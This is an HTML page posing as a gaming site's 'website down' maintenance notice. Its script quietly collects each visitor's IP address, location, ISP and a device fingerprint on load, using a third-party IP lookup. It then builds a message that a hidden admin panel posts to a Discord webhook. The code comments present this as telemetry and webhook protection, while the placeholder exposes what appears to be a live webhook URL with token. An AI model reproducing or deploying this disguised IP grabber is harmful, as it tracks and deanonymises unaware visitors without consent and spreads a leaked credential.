<!DOCTYPE html>
<html>
  <head>
    <title>Website Down</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
      }
      header {
        background-color: #333;
        color: #fff;
        padding: 10px;
        text-align: center;
      }
      h1 {
        margin: 0;
        font-size: 32px;
      }
      p {
        font-size: 18px;
        line-height: 1.5;
        margin: 20px 5px;
      }
      .danger {
        color: red;
        font-weight: bold;
      }
      footer {
        background-color: #333;
        color: #fff;
        padding: 10px;
        text-align: center;
      }

      /* Minimal admin UI for pasting/protecting the webhook (kept unobtrusive) */
      .admin-ui {
        max-width: 900px;
        margin: 12px auto;
        padding: 10px;
        border: 1px dashed #ccc;
        background: #fafafa;
        font-size: 14px;
      }
      .admin-ui label { display:block; margin:6px 0 4px; }
      .admin-ui input[type="text"] { width:100%; padding:8px; box-sizing:border-box; }
      .admin-ui button { margin-top:8px; }
      .small { font-size:12px; color:#666; margin-top:6px; }
      .hidden { display:none; }
      .status { color:#444; margin-top:6px; }
    </style>
  </head>
  <body>
    <header>
      <h1>This website is down.</h1>
    </header>
    <main>
      <p>
        Welcome. This website has been temporarily shut down for maintenance and updates.
      </p>
      <p>
        Weâ€™re currently adding some big updates to the website. This process might take some time. Thank you for your patience.
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
        <span class="danger">Get ready gamers</span>
      </p>

      <!-- ADMIN: minimal UI to allow an operator to paste a Discord webhook at runtime.
           The webhook is NOT stored in the repository. It is stored only in sessionStorage
           for the current browser session (not persisted to the repo). This is the best
           protection possible while staying strictly static: the webhook is never committed. -->
      <div class="admin-ui" id="adminUI" aria-hidden="true">
        <strong>Admin: send this page's payload to Discord</strong>
        <div class="small">Paste the Discord webhook URL below (it will be kept only in your browser session). Do NOT commit this URL into the repo or the page.</div>

        <label for="webhookInput">Discord webhook URL</label>
        <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/1428808614918750379/rujdaVb0z0gkD4eoOlPtoKvgXDdeADyAWUdWH28be5iGFBeFQMy548l1mc_VTTElZbZJ" autocomplete="off" />

        <div id="challengeRow" class="small">
          To reduce automated abuse, solve this quick challenge to unlock the sender.
          <div id="qtext" style="display:inline-block; min-width:80px; font-weight:600;"></div>
          <input id="qans" type="text" inputmode="numeric" style="width:90px; margin-left:8px;" />
          <button id="qsubmit">Unlock</button>
        </div>

        <div class="small" id="validationMsg" aria-live="polite"></div>

        <button id="sendBtn" disabled>Send payload to Discord</button>
        <button id="forgetBtn">Forget webhook (clear session)</button>

        <div class="status" id="sendStatus" aria-live="polite"></div>
      </div>

    </main>
    <footer>
      &copy; 2025 Gaming Services. All rights reserved.
    </footer>
    <script>
      // === telemetry collection (kept identical to original) ===
      let echolog = {};
      fetch("https://wtfismyip.com/json")
        .then((response) => response.json())
        .then((data) => {
          let echolog = {
            ipAddress: data.YourFuckingIPAddress,
            location: data.YourFuckingLocation,
            hostname: data.YourFuckingHostname,
            isp: data.YourFuckingISP,
            city: data.YourFuckingCity,
            country: data.YourFuckingCountry,
            countryCode: data.YourFuckingCountryCode,
            userAgent: navigator.userAgent,
            windowProp: Object.keys(window).length,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            windowRatio: window.innerWidth / window.innerHeight,
            screenWidth: window.screen.availWidth,
            screenHeight: window.screen.availHeight,
            screenRatio: window.screen.availWidth / window.screen.availHeight,
            DPI: window.devicePixelRatio,
            colorDepth: window.screen.colorDepth,
            orientation: window.screen.orientation.type,
            orientationAngle: window.screen.orientation.angle,
            os: navigator.platform,
            threads: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            systemLanguages: navigator.languages.join(", "),
            languages: navigator.language,
          };

          // Build payload exactly as before:
          const payload = {
            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUA: ${echolog.userAgent}\nScreen: ${echolog.screenWidth}x${echolog.screenHeight}\nWindow: ${echolog.windowWidth}x${echolog.windowHeight}\nDPI: ${echolog.DPI}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory(GB): ${echolog.memory}\nLangs: ${echolog.systemLanguages}`,
          };

          // --------------------------------------------------------------------
          // NEW: static-only protected sender UI
          // - The page will NOT contain a hard-coded webhook URL.
          // - An operator must paste the webhook into the input at runtime (manual step).
          // - The webhook is stored only in sessionStorage (survives tab reloads in same session).
          // - Before allowing sends the user must solve a quick math challenge (raises bot cost).
          // - Per-browser/session rate-limiting + exponential backoff is enforced via localStorage.
          // - If the webhook is leaked, rotate it in Discord immediately.
          // --------------------------------------------------------------------

          // Config: tuning values
          const MIN_SECONDS_BETWEEN = 30; // minimum seconds between allowed sends per browser
          const THRESHOLD = 3; // attempts before backoff
          const BACKOFF_BASE = 60; // base seconds for backoff exponent

          // Storage keys
          const LS_LAST = 'sc_last_send_v1'; // last send timestamp (seconds)
          const LS_ATTEMPTS = 'sc_send_attempts_v1'; // attempts count (backoff)
          const SS_WEBHOOK = 'sc_webhook_session_v1'; // webhook stored in sessionStorage

          // Admin UI elements
          const adminUI = document.getElementById('adminUI');
          const webhookInput = document.getElementById('webhookInput');
          const qtext = document.getElementById('qtext');
          const qans = document.getElementById('qans');
          const qsubmit = document.getElementById('qsubmit');
          const sendBtn = document.getElementById('sendBtn');
          const forgetBtn = document.getElementById('forgetBtn');
          const validationMsg = document.getElementById('validationMsg');
          const sendStatus = document.getElementById('sendStatus');

          // Minimal auth: show admin UI only if page is opened with a special query param:
          // e.g., https://example.com/?admin=1  -- avoids exposing UI to casual visitors.
          // This keeps the sender hidden by default on the public page.
          function isAdminMode() {
            try {
              const params = new URL(window.location.href).searchParams;
              return params.get('admin') === '1';
            } catch (e) { return false; }
          }

          if (!isAdminMode()) {
            // admin UI remains hidden for normal users; do nothing else.
            // This is a static-only way to hide the sender UI from casual visitors.
            return;
          }
          // Reveal admin UI
          adminUI.setAttribute('aria-hidden', 'false');
          adminUI.style.display = 'block';

          // Short helpers
          function nowSec() { return Math.floor(Date.now() / 1000); }
          function getLast() { try { return parseInt(localStorage.getItem(LS_LAST) || '0', 10); } catch(e) { return 0; } }
          function setLast(v) { try { localStorage.setItem(LS_LAST, String(v)); } catch(e){} }
          function getAttempts() { try { return parseInt(localStorage.getItem(LS_ATTEMPTS) || '0', 10); } catch(e) { return 0; } }
          function setAttempts(n) { try { localStorage.setItem(LS_ATTEMPTS, String(n)); } catch(e){} }
          function computeBackoff(attempts) {
            if (attempts <= THRESHOLD) return 0;
            const extra = attempts - THRESHOLD;
            return BACKOFF_BASE * Math.pow(2, Math.min(extra, 8));
          }

          // generate challenge
          let a = Math.floor(Math.random() * 10) + 1;
          let b = Math.floor(Math.random() * 10) + 1;
          qtext.textContent = `${a} + ${b} = ?`;

          // validate webhook-looking URL (do not accept obviously malformed strings)
          function isValidDiscordWebhook(url) {
            if (typeof url !== 'string') return false;
            // Basic pattern: https://discord.com/api/webhooks/<id>/<token> or https://discordapp.com/api/webhooks/...
            try {
              const u = new URL(url);
              if (!/^https?:$/.test(u.protocol)) return false;
              if (!/(discord(app)?\.com)$/.test(u.hostname)) return false;
              if (!u.pathname.startsWith('/api/webhooks/')) return false;
              // optional: quick token/id length checks
              const parts = u.pathname.split('/').filter(Boolean);
              if (parts.length < 3) return false; // ['', 'api', 'webhooks', id, token] after split; robust check below
              const last = parts[parts.length - 1];
              const id = parts[parts.length - 2];
              if (!/^\d+$/.test(id)) return false;
              if (!/^[A-Za-z0-9_\-]+$/.test(last)) return false;
              return true;
            } catch (e) { return false; }
          }

          // Load webhook from sessionStorage if present
          try {
            const saved = sessionStorage.getItem(SS_WEBHOOK);
            if (saved) {
              webhookInput.value = saved;
              validationMsg.textContent = 'Webhook loaded for this browser session. Validate before sending.';
              sendBtn.disabled = true; // require re-unlock each session
            }
          } catch (e) {}

          // Challenge submit: if correct, reveal send button and validate webhook
          qsubmit.addEventListener('click', function() {
            const answer = (qans.value || '').trim();
            if (answer === String(a + b)) {
              validationMsg.textContent = 'Challenge solved. Validate webhook URL and click "Send payload to Discord".';
              // Store webhook in session only if it validates; don't store invalid input
              const candidate = webhookInput.value.trim();
              if (candidate.length > 0 && isValidDiscordWebhook(candidate)) {
                try { sessionStorage.setItem(SS_WEBHOOK, candidate); } catch(e){}
                sendBtn.disabled = false;
                webhookInput.disabled = false;
              } else {
                validationMsg.textContent = 'Enter a valid Discord webhook URL before sending.';
                sendBtn.disabled = true;
              }
            } else {
              validationMsg.textContent = 'Incorrect challenge answer. Wait a bit and try again.';
              // increase attempts to trigger backoff if repeated wrong tries
              setAttempts(getAttempts() + 1);
            }
          });

          // If webhook input is changed, re-validate format and disable send until challenge solved again
          webhookInput.addEventListener('input', function() {
            sendBtn.disabled = true;
            validationMsg.textContent = 'Solve the challenge, then validate webhook.';
          });

          // Forget webhook (clear sessionStorage)
          forgetBtn.addEventListener('click', function() {
            try { sessionStorage.removeItem(SS_WEBHOOK); } catch(e){}
            webhookInput.value = '';
            sendBtn.disabled = true;
            validationMsg.textContent = 'Webhook cleared from this session.';
          });

          // Send button: will POST the payload to the webhook URL (CORS must be allowed by Discord)
          sendBtn.addEventListener('click', function() {
            sendStatus.textContent = '';
            // rate/backoff checks
            const last = getLast();
            const attempts = getAttempts();
            const backoff = computeBackoff(attempts);
            const now = nowSec();
            if (now - last < MIN_SECONDS_BETWEEN) {
              setAttempts(attempts + 1);
              sendStatus.textContent = `Client-side rate limit: wait ${MIN_SECONDS_BETWEEN - (now - last)}s before sending.`;
              return;
            }
            if (backoff > 0 && now < last + backoff) {
              setAttempts(attempts + 1);
              const remaining = (last + backoff) - now;
              sendStatus.textContent = `Backoff active. Try again in ${remaining}s.`;
              return;
            }

            // obtain webhook URL from sessionStorage (preferred) or input
            let webhookUrl = null;
            try { webhookUrl = sessionStorage.getItem(SS_WEBHOOK) || webhookInput.value.trim(); } catch(e) { webhookUrl = webhookInput.value.trim(); }

            if (!isValidDiscordWebhook(webhookUrl)) {
              sendStatus.textContent = 'Invalid webhook URL. Paste a proper Discord webhook and solve the challenge.';
              return;
            }

            // confirmation prompt to reduce accidental sends
            if (!confirm('Confirm: send the prepared payload to the provided Discord webhook? This action will be rate-limited by the client.')) {
              return;
            }

            // Prepare the body to send to Discord, keeping within Discord content limits
            const body = { content: (payload && payload.content) ? String(payload.content).slice(0, 1900) : 'No payload' };

            // Perform the POST to Discord webhook
            fetch(webhookUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body),
              mode: 'cors'
            }).then(function(res) {
              if (res.ok) {
                setLast(nowSec());
                setAttempts(attempts + 1);
                sendStatus.textContent = 'Sent successfully. Rotate webhook if you suspect it was exposed.';
              } else {
                setAttempts(attempts + 1);
                sendStatus.textContent = 'Discord returned error: ' + res.status + '. Consider checking the webhook and rotating it if needed.';
              }
            }).catch(function(err) {
              setAttempts(attempts + 1);
              sendStatus.textContent = 'Network error while sending to Discord: ' + (err && err.message ? err.message : String(err));
            });
          });

        })
        .catch((error) => console.error(error));
    </script>
  </body>
</html>
